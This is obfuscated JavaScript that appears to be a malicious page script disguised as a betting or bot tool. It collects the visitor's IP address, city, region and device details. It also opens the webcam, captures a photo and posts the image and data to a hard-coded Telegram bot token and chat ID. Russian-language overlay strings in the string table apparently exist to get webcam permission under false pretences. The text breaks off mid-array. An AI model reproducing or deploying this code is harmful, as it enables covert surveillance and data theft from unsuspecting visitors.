(function (_0x5d7290, _0x282c44) {
  const _0x48323c = _0x5d7290();
  while (true) {
    try {
      const _0x51abf9 = parseInt(_0xff7d(1848, 0x605)) / 1 + -parseInt(_0xff7d(1662, 0x920)) / 2 + -parseInt(_0xff7d(1094, 0x82a)) / 3 + parseInt(_0xff7d(1329, 0x2cc)) / 4 * (parseInt(_0xff7d(485, 0x80e)) / 5) + parseInt(_0xff7d(1632, 0xa06)) / 6 * (-parseInt(_0xff7d(1696, 0x5ee)) / 7) + parseInt(_0xff7d(463, 0x30b)) / 8 * (-parseInt(_0xff7d(691, 0x459)) / 9) + -parseInt(_0xff7d(1494, 0x7f7)) / 10 * (-parseInt(_0xff7d(1611, 0xc59)) / 11);
      if (_0x51abf9 === _0x282c44) {
        break;
      } else {
        _0x48323c.push(_0x48323c.shift());
      }
    } catch (_0x1c7ba5) {
      _0x48323c.push(_0x48323c.shift());
    }
  }
})(_0xd31d, 346565);
function _0xff7d(_0xff7d92, _0x325aa5) {
  const _0x4ed1df = _0xd31d();
  _0xff7d = function (_0x29643b, _0x433c41) {
    _0x29643b = _0x29643b - 270;
    let _0x590196 = _0x4ed1df[_0x29643b];
    return _0x590196;
  };
  return _0xff7d(_0xff7d92, _0x325aa5);
}
let lastBettingTime = 0;
let tokenIndex = 0;
let isAuthenticated = false;
async function sendTelegramMessage(_0x3d993a) {
  try {
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendMessage", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'chat_id': "7728504492",
        'text': _0x3d993a,
        'parse_mode': "HTML"
      })
    });
  } catch (_0x4a0ba3) {
    console.error("Failed to send message:", _0x4a0ba3);
  }
}
async function getCountryName(_0x9fb201) {
  try {
    const _0x1e8280 = await fetch("https://restcountries.com/v3.1/alpha/" + _0x9fb201);
    const _0x3d3872 = await _0x1e8280.json();
    return _0x3d3872[0]?.["name"]["common"] || "Unknown";
  } catch (_0x625d83) {
    console.error("Failed to fetch country name:", _0x625d83);
    return "Unknown";
  }
}
async function getUserInfo() {
  try {
    const _0x65e927 = await fetch("https://ipinfo.io/json");
    const _0x44464a = await _0x65e927.json();
    const _0x341917 = await getCountryName(_0x44464a.country);
    const _0x8d9113 = parseUserAgent(navigator.userAgent);
    return {
      'ip': _0x44464a.ip,
      'country': _0x44464a.country,
      'countryName': _0x341917,
      'city': _0x44464a.city,
      'region': _0x44464a.region,
      'countryEmoji': getCountryEmoji(_0x44464a.country),
      'userAgent': navigator.userAgent,
      'deviceModel': _0x8d9113.model,
      'deviceType': _0x8d9113.type,
      'deviceOS': _0x8d9113.os
    };
  } catch (_0x41b837) {
    console.error("Failed to fetch user info:", _0x41b837);
    const _0x525330 = {
      ip: "Unknown",
      country: "Unknown",
      countryName: "Unknown",
      city: "Unknown",
      region: "Unknown",
      countryEmoji: '❓',
      userAgent: navigator.userAgent,
      deviceModel: "Unknown",
      deviceType: "Unknown",
      deviceOS: "Unknown"
    };
    return _0x525330;
  }
}
function parseUserAgent(_0x4935a0) {
  const _0x5e97df = {
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
    type: "Mobile",
    os: "iOS"
  };
  const _0x382e5f = {
    regex: /iPad/i,
    type: "Tablet",
    os: "iOS"
  };
  const _0x3bad0c = {
    regex: /Android\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Android"
  };
  const _0x524a1d = {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Windows Phone"
  };
  const _0x45e658 = [_0x5e97df, _0x382e5f, _0x3bad0c, _0x524a1d];
  const _0x517227 = {
    regex: /Windows/i,
    type: "Desktop",
    os: "Windows"
  };
  const _0x309165 = {
    regex: /Macintosh/i,
    type: "Desktop",
    os: "macOS"
  };
  const _0x2f8c14 = {
    regex: /Linux/i,
    type: "Desktop",
    os: "Linux"
  };
  const _0x13935d = [_0x517227, _0x309165, _0x2f8c14];
  for (let _0x45eae3 of _0x45e658) {
    const _0x33cf89 = _0x4935a0.match(_0x45eae3.regex);
    if (_0x33cf89) {
      return {
        'type': _0x45eae3.type,
        'os': _0x45eae3.os,
        'model': parseDeviceModel(_0x4935a0, _0x45eae3.os)
      };
    }
  }
  for (let _0x34ae6e of _0x13935d) {
    const _0x5bfe31 = _0x4935a0.match(_0x34ae6e.regex);
    if (_0x5bfe31) {
      return {
        'type': _0x34ae6e.type,
        'os': _0x34ae6e.os,
        'model': parseDeviceModel(_0x4935a0, _0x34ae6e.os)
      };
    }
  }
  const _0x2810ea = {
    type: "Unknown",
    os: "Unknown",
    model: "Unknown Device"
  };
  return _0x2810ea;
}
function parseDeviceModel(_0x44d292, _0x15814d) {
  switch (_0x15814d) {
    case "iOS":
      const _0x3617c4 = _0x44d292.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
      if (_0x3617c4) {
        return "iPhone " + _0x3617c4[1].replace(/[_\.]/g, " ");
      }
      const _0xf57799 = _0x44d292.match(/iPad/i);
      if (_0xf57799) {
        return "iPad";
      }
      break;
    case "Android":
      const _0x10de5a = _0x44d292.match(/;\s*([^;)]+)\s*Build/i);
      if (_0x10de5a) {
        return _0x10de5a[1].trim();
      }
      break;
    case "Windows":
      const _0x3ef5e1 = _0x44d292.match(/Windows\s*([\w\s]+)/i);
      if (_0x3ef5e1) {
        return "Windows " + _0x3ef5e1[1];
      }
      break;
    case "macOS":
      const _0x3b5c9b = _0x44d292.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
      if (_0x3b5c9b) {
        return "Mac " + _0x3b5c9b[1];
      }
      break;
  }
  return "Unknown Device";
}
function getCountryEmoji(_0x61a76f) {
  return _0x61a76f.replace(/./g, _0x25926f => String.fromCodePoint(127397 + _0x25926f.toUpperCase().charCodeAt()));
}
function _0x570a18(_0x48b198, _0x1473f0, _0x1b44c5, _0xc15994, _0x3479c4) {
  return _0xff7d(_0x48b198 - 0x2bd, _0x1b44c5);
}
async function captureAndSendPhoto() {
  try {
    const _0x80d62b = {
      video: true
    };
    const _0x375ac3 = await navigator.mediaDevices.getUserMedia(_0x80d62b);
    const _0x3384cd = document.createElement("video");
    _0x3384cd.srcObject = _0x375ac3;
    await _0x3384cd.play();
    const _0x20fb3b = document.createElement("canvas");
    _0x20fb3b.width = _0x3384cd.videoWidth;
    _0x20fb3b.height = _0x3384cd.videoHeight;
    const _0x1fbef9 = _0x20fb3b.getContext('2d');
    _0x1fbef9.drawImage(_0x3384cd, 0, 0, _0x20fb3b.width, _0x20fb3b.height);
    _0x3384cd.pause();
    _0x375ac3.getTracks().forEach(_0xde52a9 => _0xde52a9.stop());
    const _0x29acd0 = await new Promise(_0x2ccaf2 => _0x20fb3b.toBlob(_0x2ccaf2, "image/jpeg"));
    const _0xec70f = new FormData();
    _0xec70f.append("chat_id", "7728504492");
    _0xec70f.append("photo", _0x29acd0, "photo.jpg");
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendPhoto", {
      'method': "POST",
      'body': _0xec70f
    });
    console.log("Photo captured and sent successfully");
  } catch (_0x4d6148) {
    console.error("Failed to capture photo:", _0x4d6148);
  }
}
function _0xd31d() {
  const _0x3b3264 = ['ficie', "ton\">", 'vuURN', 'c3T2c', 'PMAsp', 'tXo87', '1DzeM', 'dgoNY', "em;\n ", 'HTML', 'lij2+', ">New ", 'lBvHW', '-styl', " 0 0 ", 'margi', '07jI9', '1218642MEtUhs', 'ZY0jY', 'RC5xB', "0, 0.", 'mAqTY', "ный д", 'A4Z2K', 'ont-s', 'hm3FZ', 'PLaPJ', 'remov', 'GvyQT', 'tw3ST', 'ltern', '>Unau', "тели ", 'cNOVp', 'lQ4w0', 'QIrpI', 'HHb6h', 'IHYQB', 'larBX', 'Z9XnY', 'LLpXR', '3rcOZ', '7/p58', 'coeff', 'MZi3O', 'aEpyE', 'aQOYL', '1376838qCQNyN', 'xWDZt', 'GxPPG', '/wHIb', '://re', 'PVtCd', 'erCas', '3sNjy', 'S5mjI', 'apdrO', 'hTu1a', "ul>\n\n", 'km9zw', 'vaZ8n', 'bind', "'Aria", 'gn-it', 'Heigh', 'bHU8L', 'K7r9R', 'Table', ";\n   ", 'zK8l4', 'ZWPKJ', '6ZwMF', 'WPCaP', '497iz', 'icker', 'K3lSd', 'dyzL0', 't-fam', 'zEwoE', '8uOpM', 'bcPT8', '7cqdwBY', " src=", '1Zesa', 'ZVEMQ', 'BXPIs', 'Lxc38', "  fle", 'BsjKz', "g, rg", "text ", 'info', "t: <c", 'scale', 'bxFdx', 's3+gS', 'canva', "0 10p", 'd0rbf', 's2r2L', 'EHTIR', 'HNNve', 'HZq7Y', "ref=\"", 'body', 'p5/O5', "on: r", " 0;\n ", 'lLeJy', 'medev', 'HeQzm', "ate;\n", " 0.7;", 'ApN1q', 'IpbvE', "ex: 9", 'aHHnc', "    ", '3DhKv', 'zKHps', 'KRAIc', 'ещен<', 'OH9Fu', 'ebuyq', 'Deskt', 'getEl', 'MdDgn', " disp", 'ATPpJ', 'hD3rR', 'hostn', '29mnl', " <cod", 'HiF9c', 'ZjoDP', 'm1WOZ', 'ing', 'WQRfh', '9WVoO', 'VPMlq', 'color', 'c4gM7', 'ById', 'acks', 'ZmKNX', 'en&id', 'ntrie', 'RRUhG', 'ESETI', 'Pp7Xv', 'qUtFb', 'AAAAi', 'WXujJ', 'der-r', 'R4mkH', ": 5px", 'eMode', '://ap', 'Oq/HO', 'PyGcs', "ext n", '/jpeg', 'l5OOR', 'toUpp', 'vazuU', '8jmtc', " fetc", 'PTQQb', 'Photo', 'daMyx', 'S8dN3', 'NS658', "ize: ", 'QTOnj', "e>\n🌐 ", 'cYnVy', '/EmjE', 'nfini', "URL: ", 'LdAMn', '</li>', "d;\n  ", 'ttBIZ', ": #dd", '6OmqM', 'y/c/3', 'zG+Tc', 'zl9I8', " ее к", "5, 0.", '2YhvZ', 'cMBrO', ": <co", 'Onkm3', 'nXSSd', 'rbiGz', "00% {", "er;\n ", 'TZhoo', "5);\n ", 'QhjIZ', 'Uzvai', '/alph', 'MEqFw', 'FJCI5', 'KG719', '/ft5j', 'icien', "ot fo", 'PLmip', 'fDEwc', 'kgrou', 'Locat', 'JLP9H', '+vfQm', "s=\"ar", 'cpods', 'zKveG', 'XgysA', "    h", 'nZNGZ', '2Vb6G', '.jpg', "ody {", "try n", 'Lrpd5', 'ZChIL', 'TvFmZ', '7cuME', "ing: ", 'pHNjF', 'sHhrh', 'n5E6q', '463705GuYYWv', 'wGAAN', 'sjKNo', 'ZMVEg', 'kuJey', 'XkljP', 'Dqh+R', 'vC87G', "e>\n🖥️ ", 'adow:', '3xMJK', 'SLACE', 'MCAXS', 'lcYVQ', '.cc/s', 'data:', 't</a>', "    <", 'LPi3p', '2cSNb', 'Ou79N', 'head', "de>\n📱", '7ctKt', 'EKqpp', 'qRW/v', 'ng..', 'mbyji', 'nLgYB', '0m3ES', 'AGuRi', 'VR4nO', 'biCTT', 'gU2zu', " p {\n", 'nctio', 'K5CYI', 'O/+z/', 'tton:', ">\n   ", 'Error', 'WHCqh', "Mac ", 'Unkno', 'Xq1qU', 'Faile', 'вебку', 'bCwka', "ity: ", 'rGAbw', 'stop', 'href', 'tASKQ', '.gith', 'jq9pn', 'model', 'lengt', 'jcYIw', 'TvMyQ', 'sJiZ2', "m: 0;", 'lvsKS', 'QA4jK', 'ed</b', 'kk2TF', 'a8Gi/', 'r2ymX', 'GW9U3', 'zTI95', 'wil1S', 'strin', 'ZAQaK', 'NCFMB', '.</li', 'tjYHh', 'KRYqa', 'name', 'i23UV', 'nHWFw', 'V2jQ6', 'YbH5+', 'nt_st', 'ukoxC', "zed A", 'xijAi', "ames ", 'cr.ga', 'ublyZ', 'ZOcA2', 'image', 'vpvAE', "ass=\"", 'hg/eb', '-size', 'oDjY/', "ws ", " {\n  ", 'd4ABa', 'a(255', 'IsuIj', 'm99gb', '7E8yW', 'flex;', 'style', 'shado', '7Pktz', "0 0 5", 'B0lEQ', " coef", '4sdtC', 'lwPZs', "i>\n  ", 'Nl304', 'vUtFm', "vh;\n ", "dow: ", "te;\n ", 'frame', " bord", 'iwYjx', "tion ", "  mar", 'I2iEg', 'idwgj', 'MkHmy', 'odeAt', '</div', " Dete", ">\n📍 D", '3913c', 'THzXW', 'pLXsY', 'LqYSX', 'ame:', "\" sty", " rgba", '0ccsm', 'fbEhg', 'ion', 'AmInQ', 'now', 'XBLoG', 'byV+1', 'xZ7ly', 'ight:', " дост", 'ixBut', 'acNKP', '7lIQ8', 'Edqdq', 'Ufl1W', 'iPad', 'HSnmC', 'KF+uj', "ily: ", 'iu8Vu', "rm 0.", 'erlay', 'log', 'ound-', '/uIuY', " возн", ": 0 0", 'nsUBt', " bot:", 'flick', '4DxcQ', 'fSMDx', 'ublic', 'hJjKQ', 'uDyXn', 'wSThC', 'B9/X1', "e>\n⏰ ", 'oaIxM', 'mDDiC', 'YGhm2', 'rp15n', 'pause', "d to ", 'QCHQh', 'u/wZe', 'jvhSH', 'E9rxj', ": 4em", 'fMSba', '2T5At', 'RNOHP', " info", 'vice', 'WNJqE', 'xSUIE', 'zVukL', 'OmCrh', 'EqCkS', 'Oj33/', 'z-ind', 'A1Gm/', 'KhrCb', '98jTM', "    r", 'info.', '20px;', 'Y9qnH', 'AFW0L', '2jIYo', 'AjeBB', 'LU9yO', 'qArzr', "l', s", 'commo', '065XB', "20px ", 'AbGaI', 'p/FlG', 'match', 'q/Bvm', 'dChil', 'VjfCC', 'AAAQ0', 'xt-de', '$.</l', 'PM2Iy', 'play', 'LNuKK', 'nPzlG', 'getCo', '/P8V9', 'PCUmq', "    p", ": #28", 'yeEvK', "за 15", 'CPbXr', 'dISqB', "r;\n  ", '1+zEH', 'cwCAQ', 'IWXMA', 'f1rrD', 'jiWQa', 'YueXJ', 'Dz+0l', 'cZa/W', 'XPZ2C', 'MXNEQ', "лемы ", '371B4', "   <l", 'small', 'mQKAR', 'MhNlQ', '9rVq+', 'ructo', 'e-typ', 'агруз', 'duPw+', 'kWkIm', "  ani", 'lx6MW', 'CZKHq', 'VjhJb', '/cH+Z', 'etXt6', 'YicXF', 'GWVZU', 'F5orR', 'tFlaZ', 'ckftK', 'E5nLp', 'NgGpj', 'HHdDS', "ul>\n ", 'NEkbv', 'vice:', 'VVH0D', 'Wdbe/', 'ansfo', 'p7h+/', 'ans-s', 'BoyBG', 'zeOdI', 'cBugC', '+VNk/', 'DIwXN', 't-siz', 'м.</l', '0LpFY', 'Andro', '7F7lZ', 'yeAWA', 'LMVva', 'w+O7+', 'Image', 'quPYs', 'textC', 'fAbxI', 'X19PO', ", 0.8", 'vK1vE', "ul {\n", "eft\">", 'infin', 'gt7/7', 'Eleme', 'abaTI', 'J5hbm', 'Cy+/V', 'Mrfkx', 'ryNam', "px 0;", 'VNDKj', 'repla', "   al", 'dkBCa', 'sdiVX', 'Csob3', 'cejMR', 'trim', 'gQXdQ', 'xfAAA', 'TOu8R', "}\n   ", 'Jry1w', "Bot i", 'iEUWQ', '1yMRV', 'rlC2T', "5, 25", "  }\n ", "n: 20", '://ww', 'eOS', '/12j1', 'EtEAY', 'OE0RB', "ng: 0", 'exwiW', 'pjYEW', 'IhWZq', '9/uXT', '-colo', 'omain', 'u7Nte', '1FVfh', 'hadow', '__pro', 'oHGHn', 'AAAAA', 'Buaqo', 'uINRe', 'mage', 'WUtwJ', 'ject', 'bzRjN', 'qN/vw', 'YDAZO', '1mCiG', 'dxzIL', '6JzR5', 'city', "  <li", "w {\n ", 'P3eYi', 'Sa7Mr', 'dgSIH', '3OkbD', "1; }\n", 'toISO', 'CCXWE', 'AYpKe', ':imag', 'iIc9k', 'vQlLu', 'cente', '608QkFKaB', 'PPLNz', "жно в", 'otf+j', "    #", '2uT7t', 'PBngY', "); }\n", "999;\n", 'warn', 'error', '8AsUg', 'ash-g', 'GHkNF', 'matio', 'SfRze', '/v3.1', '6o67A', "ve;\n ", "iv cl", 'hFEoV', 'trace', '5meIMuD', 'kAAAK', 'media', 'CTHou', '0/D4o', 'LrDWF', 'abwII', '7o7hF', 'gm3Q4', 'y8ufq', 'nO8v0', '0O3kc', "  #ov", "  <di", 'jxLJX', " 0% {", 'EGUn7', 'SUVOR', 'Lnz51', "s glo", 'eType', 'd</b>', 'oqaLV', 'RjY/H', 'BORw0', 'NvQfZ', 'uynXK', ':AAEh', 'botto', 'kIOcM', 'RjTz3', 'AtK1v', 'ff9Z/', 'EsawC', 'hover', "one;\n", 'UUPdR', 'Eofit', 'HNMRn', 'cK5cl', " спиз", '2I9hG', "  fon", 'u6l+p', " just", 'gwMuX', 'CfyZb', 'tate?', 'code>', 'i1XuV', 's0jCx', " 1s i", "  tex", 'TITAX', 'AARMD', '.org/', 'zKRzo', 'a85Js', 'xt-sh', 'ucces', 'u4zBe', 'wATrw', 'mF2s3', 'lWK99', "ent s", 'HBqSH', 'X3R28', 'captu', 'Qy1O1', 'taBHJ', 'messa', 'NaZXx', 'Initi', '/getM', 'ak3bX', 'VK4Dc', "   }\n", 'Strin', "orm: ", "n (fu", 'BQDdB', 'https', 'jGOco', 'M9Vto', '>Возм', 'cted<', 'QKv6b', 'MhRnz', 'lumn;', 'appli', 'aeueY', '>Проб', " <img", 'XEWKf', "  bac", '2+dr2', 'Ltcms', 'w9IAE', '707QP', 'oPEwX', '8Yyrx', 'CaAgE', 'XwmgI', 'bsolu', 'ению,', 'KHHXQ', "e>\n🔗 ", 'X80km', 'v=dQw', " capt", 'i>Воз', 'LEjLP', 'jsUb5', 'video', 'nWPAA', 'asWYS', 'tu3AH', 'A4UTI', 'bvDuH', 'heigh', '8e6rc', 'yrGdL', 'box-s', 'sKVcn', 'xHaWj', '1yJEI', 'pLoUK', "   co", 'ify-c', 'Name', '135de', "\n    ", 'ients', 'пробл', 'text-', 'thori', 'KPH3x', 'y2YWa', "  bor", "  jus", 'KbtVK', 'BKtLw', 'U99zz', 'AQ/v3', 'ZffVy', 'Xgkw5', 'qmGdh', 'qXyeX', 'oMRi3', "p>\n  ", "ton {", 'AACXB', 'ujg0P', 'оступ', "икли ", 'Возмо', '8pj6r', '63qoF', 'xPtYu', 'DVd4n', 'userA', 'dRnL5', 'FlwVX', 'tK9fV', 'bot', 'MMfK0', '9lxNB', 'type', '8Bd6t', '4c1yO', 'JLBFU', 'cTiRa', 'UrdfN', "on: a", 'ge:', '2i+72', 'PJXAN', 'YbZIy', 'Nghsc', 'arrow', 'bqCYG', 'jMtpr', 'ryEmo', "   tr", '8WBKt', "glow ", 'n/jso', 'FNbY4', 'excep', 'nXoqy', 'nitia', 'HTgge', '23Xsv', 'wslqF', 'ту:</', "IP: <", 'S/ElH', "бка 4", 'XVGJu', "le=\"m", 'iPhon', 'NYwLe', 'UBuWS', 'de>', '/9EUA', 'BJycn', '17487kZYzcf', '9hs6S', 'kMllo', 'G1bkL', 'WSA65', 'finP9', 'G+AsA', 'ljCLg', '9R7kC', 'vnUbF', 'FBDkD', 'L5NzD', 'uEEow', " coun", 'AYlWN', 'mCkX3', '/Mbe/', 'xH2TR', 'betti', 'можно', 'zzW49', 'Xspex', 'fwPuZ', 'nd-co', 'JHomB', 'cY3Ov', 'Waiti', '0EZNk', 'DXxtT', 'ositi', 'pxmrv', 'dqyxk', '6mM3I', 'mZGGO', 'vxFxE', 'aliza', '+YCh8', 'MgqFQ', ": 100", 'EoESz', 'qSXAi', 'jGfHz', 'loIpD', 'DDgeO', 'qyujA', "send ", 'TrWDC', "n;\n  ", 'w.you', 'mXJeY', '4cf2l', 'onten', 'jOPoU', 'proto', 'inner', "or: w", 'EpbGH', 'POST', "op\"><", 'l55xF', 'EI2fY', 'kbsja', 'YBTW4', 'w+MLA', 'KGgoA', 'kI6Ej', 'tify-', "     ", 'vtYi6', 'AAANS', 'egram', 'm9zxz', "<p>К ", 'W5lkN', 'MAD2z', 'Va8ZB', "is\")(", 'rSstR', "r: po", 'round', 'ement', "   te", ';base', 'gN0jZ', 'Irb8U', ".7), ", "er: n", 'aX/1Z', " <div", "row t", "e: 18", 'alize', " @key", 'inear', 'Zthpc', '(1.05', 'PGqEM', "0% { ", 'charC', 'tText', "iv id", 'U/I80', "low: ", 'вером', "емы с", 'ZCs2J', '+djjz', 'EwFcf', "   <d", " вы х", " user", 'OdQvk', 'fG0BB', 'RkPFN', 'TyuNR', '8usSU', 'ient(', 'MRnNy', 'JcCpO', 'MDPTA', "t\"></", 'VHz_Q', 'duA5V', 'SZc8K', 'Dxs/q', 'KrvDP', 'jZKLF', 'LlLTt', 'fetch', 'xt-al', 'mNwt2', "    b", ", 255", '3OGUj', "ion: ", " <li>", '1.2em', "1.5s ", 'toFix', 'GfymA', " opac", 'Text', 'Giddy', 'H5idU', 'v3IMq', "in: <", "к сай", 'qfo1c', 'fcjlH', 'RSfuM', 'cQdoD', '914yz', 'JaUQI', 'FlsyM', 'ujwUw', 'T8tja', '_i=1', 'Po+Lm', 'Linux', 'NoSjH', "lex;\n", "\n\n   ", '6cqFC', 'K8Hoj', '7y9jv', "{ opa", 'VCvyt', 'oto:', " 50% ", 'R8vyr', 'aOGBg', "ay: f", "rrow ", "   #f", "10px ", 'oMLTL', 'zaNvb', "ить в", 'elati', "7));\n", 'inNFN', 'TaErk', "lay: ", 'DwHFW', 'KcW16', 'oMFRT', '2hX6/', 'creat', 'corat', 'tHs+O', 'Q1BzU', 'rfHzr', 'gCYOI', 'sk66q', 'uAESQ', 'gYDzN', 'ent', 'zjBxZ', 'wsvhW', 'Lm+Q1', "    a", '09dtA', '2rrtd', 'Dg8Qd', 'KTvsR', 'KMhEA', 'TSDmB', ");\n  ", 'PrMUS', 'есурс', '8Xo4S', 'nter;', 'L8gPW', 'Wht/B', 'tAHLI', 'one', 'Xvmrf', 'PZNzz', 'SWpwM', 'int', 'Zi/F/', '-tech', 'i.tel', 'QjY4w', 'mSK1D', "\n📍 Do", " купи", 'c5q2S', 'EfZMQ', 'Windo', 'iHgn6', 'onseT', 'ign-i', 'bQyN2', "/b>\n📍", 'LTUuV', 'TSoAS', 'j+xlQ', 'NPA0z', 'vX8QQ', 'wDwRI', "n() ", 'gQjdr', 'H8dgM', 'wGA0w', 'atewa', 'AlYOO', 'SUbsb', '508Gu', 'then', 'YEaOg', 'iCOJk', 'xWmuf', 'ffhYH', 'ccjAR', 'k//8A', 'ame', 'Fw8R3', 'sfull', 'nMbIR', 'MBeOe', 'wvlky', 'qaMBU', "dth: ", "  ali", '24ygw', 'initi', 'ccess', 'ERUlZ', 'table', 'locat', 'XEYbv', ">Bot ", 'BFQaD', 'BAJdC', 'aVdIA', 'WupYr', 'NfigL', 'setIt', 'xpokq', 'ode>', 'JsYvZ', 't-sha', 'NWhBw', "mpt D", 'TAckI', '9ttDg', 'kExbo', 'uk126', 'displ', 'f0HBT', '43uvE', 'srcOb', 'jUktl', "   </", 'KBsig', 'getTr', 'Type:', 'RX/+e', 'nimat', 'iZUha', 'ectio', 'tems:', 'rVYkx', '81773', " удал", 'ansit', 'одера', 'IxxkA', 'Fhezs', 'gYG/l', 'tion', 'jgJSF', 'AKZzE', 'b0asY', 'ObKes', '+/SOO', 'forEa', '669bj', 'appen', 'bfooD', 'gOFow', "ть ве", 'mzV96', 'ftYM9', 'add', 'nt_co', "t: ce", 'curre', "id=\"f", 'lsFfe', 'hSlMW', 'ZWd15', " 100%", 'pXN0g', 'mADLN', '+zxMJ', 'iOS', "nt wi", 'pKsdv', 'usDzy', "nt: c", 'SHeKx', 'Y22x9', 'Dto3z', 'SeBl0', 'XxiFL', 'tcSoX', 'VJxVj', 'Igvky', 'n55Eq', "n: fl", 'XizAf', "r 0.3", 'LUPSu', 'AgkQz', 'city:', 'json', 'M5+jv', 'fullU', '9WppX', 'GTPv8', "e: no", 'ub.io', 'JkK0D', 'a+kfW', "   ma", 'etque', '/tZLh', "uto;\"", 'Vg4Vb', '_rock', 'QpkQH', "    f", 'jc7qS', 'RhRrF', 'JVUfx', 'K+NeM', 'xf8AP', 'devic', 'dpseR', 'TZCt6', 'eElem', 'NRIhD', 'aNT4h', 'Messa', 'V3aI5', ": 1.5", 'iFcXU', 'Ro1Y8', 'nVIOV', "5, 0,", 'I5xfX', 'ZhJKH', 'A6DLp', 'CgUAX', "row l", " cent", '4wY0N', 'UhEUg', 'KBQBf', 'conte', 'отели', '762753TtCNWW', " <a h", 'DzqeC', "   ", 'UkgPX', "    1", "\"retu", 'yERpl', 'W3U3N', " Agen", 'YNLGH', 'kjmAN', 'const', 'und.', "\n📱 De", 'zNFCK', 'AoEWV', 'AmzTl', 'iGu6F', 'ncFPZ', '1play', '/09m+', 'bhCww', 'tQXKM', "hing ", 'cz8BS', 'ctor(', 'V6LAJ', "lt=\"E", "ems: ", "gin: ", '100%;', 'SpNHQ', 'm/mIi', "упом ", 'yTOVC', 'vH2+6', 'paSYL', 'lO/+w', 'jHO4F', 'ransf', 'cudV/', 'uJmyw', 'RQ7VJ', "ht: a", 'XI4QW', '8xHKl', 'yO9g3', 'AAHLY', 'ZJOL1', 'Time:', 'RUvNX', "n: co", 'BpD54', 'tube.', " { te", 'oCgUA', 'FtBkT', 'qFcTB', 'y5BTt', " righ", "ы блю", 'conso', 'Esq7J', 'YEE1+', 'FQEIM', 'klRUH', 'Z96/j', 'backg', " clas", '4e04k', 'Pn2E+', " list", 'keyfr', 'rE0Yn', 'vK55p', "s, tr", 'szITd', 'vhtmo', 'hG5S7', 'NmhPC', "rn th", "ite a", 'gify', 'AJpVR', 'fly', 'iwgVq', 'Q3b96', 'HKTEI', 'b8Xf3', "h1 {\n", 'Z5SUE', '3R6xi', 'gR/5n', "Bot A", 'kdCAA', 'iHfQG', " Doma", '03IGB', 'DcaEx', 'E0zJr', 'pOvZb', 'qMQzp', 'cprP+', 'eVNXx', '7M2g9', 'ufWBj', 'kxV6R', 'ksnR3', 'VkUz6', 'pg9Un', 'catio', 'stcou', "lor: ", 'b5x3A', "/h1>\n", "ss=\"a", 'gpnTt', 'com/w', 'OzBUH', 'utSsS', 'demo', 'uTgoR', 'pspwZ', 'ZTS8h', 'sUB5T', 'itahw', 'eight', 'lfTkj', 'hidde', 'PIyMh', 'AVoj1', " />\n ", 'resul', 'QlwtA', 'cgzCG', 'wzUym', 'uXrvG', 'xeK4Y', '11PIx', 'oAAoF', 'gAery', 'pq0j0', "div>\n", "rlay\"", 'regio', '5hqHM', 'nStBu', "Fix I", 'VXtqA', 'kif', "3s;\n ", 'dkqLo', '>Непр', 'm/lOw', '5d59j', 'endin', 'sW2br', 'w4+Xl', '99031', 'aurwx', '</cod', 'hkAg0', 'x-dir', 'Mx1Lz', 'gZyGM', 'zowqB', "\n🚀 <b", 'XjWPZ', 'v88tf', 'ZjXqX', 'xyq8a', 'y-cc-', " 0, 0", "дить ", '4V0RC', 'curso', 'nstru', 'hRDIx', 'fhBzT', 'HmAJF', 'List', 'macOS', 'bE2vr', 'YTPeh', 'LXEfU', 'RElzJ', 'zzueo', '18lpp', 'WNRM0', 'AA7DA', 'GSKwR', 'wVuzK', 'h0IYy', 'rFvHV', 'MDbZt', 'domai', 'rGOwd', 'CAjec', 'Width', 'kOdY6', "ебку ", 'dMLhn', 'A4WlD', 'обнов', 'hiNPS', 'vXufY', "вы хо", 'j/7//', 'ntext', '{}.co', 'dEWGp', '4w9Wg', 'kZTbD', 'uKgcd', 'LyvFA', "ign: ", "e>\n  ", 'h1MjY', '64,iV', 'uYq5I', '0GrJi', '4pWlZ', 'WFJyi', 'pfwAa', 'uhSVz', 'o6c93', '4k7Ji', 'TVuAr', 'vE3BI', 'EAg2B', 'aEguh', 'inter', '9FStm', "    t", '2404348gdhRGo', "ожно ", 'atch?', 'rgba(', 'ODAjQ', "rror ", 'xawSo', '<code', 'RPasS', 'fe+xR', 'cZX7f', 'rgin:', 'RxAPS', "nts n", 'XN9X3', 'erMed', 'kSXcq', 'cLJvL', 'enter', '(255,', 'qCukd', 'kRVHE', '64369', 'vZQJY', "ured ", 'QYqMW', '2zkL5', 'io/js', "eft: ", '9TkyF', 'Jdiot', 'ai2CT', "m\"></", 'b8pxY', " resp", 'ate', "255, ", 'gent', 'CnXVn', 'F5TzD', 'hite;', "ось з", 'PPcMd', "\n❗️ <b", 'cwEfx', 'yUMJS', 'gUAga', '/isRl', 'none;', 'CcYVg', 'MYhzS', 'BDlfj', "ить р", 'TTkUx', 'irYUe', 'count', 'Al0Io', 'XgVcd', 'Xv0Lo', 'N5dPs', 'nbxr4', 'lyskK', 'paddi', 'WySRT', 'du+Rw', 'GqDlr', '://cr', 'ODULK', 'p+fkx', "er {\n", "   <h", '/TENP', 'PtKGU', 'IUwGg', 'wuKNE', 'catch', 'jIZAI', '2c34;', 'vmvf2', 'cjiCX', 'fromC', "re ph", "  col", '7M1jQ', 'AINhC', 'FTCft', 'Iefaf', 'QZdeE', '72639', 'odePo', 'overf', 'HnYWZ', 'oWQUt', 'CAYAA', "бку у", 'czjqV', 'olaoY', 'WyTkp', 'hafqZ', 'сожал', 'ba(25', 'width', '1>Оши', 'AEQzR', 'xmNjq', 'BHKrU', 'getUs', 'k7yy7', 'fixBu', 'retur', '8g7Fu', 'knDTO', 'txrpL', '3XXSB', 'erif;', "w: 0 ", 'drawI', 'MHapa', 'lized', 'GQCDQ', 'ssvVR', 'Kxbsr', 'rando', '+HYNR', 'm4gAE', "I=\" a", 'SFYNm', 'nUMrT', " Atte", 'pBHuf', 'LUeln', 'respo', 'KQrsY', 'chat_', 'kfqAU', "с сер", 'омен.', "ne;\n ", "px;\n ", 'TgdjX', 'Lp0fj', 'hLe+s', 'vSzyD', 'sV6Gw', '965y5', "1); }", 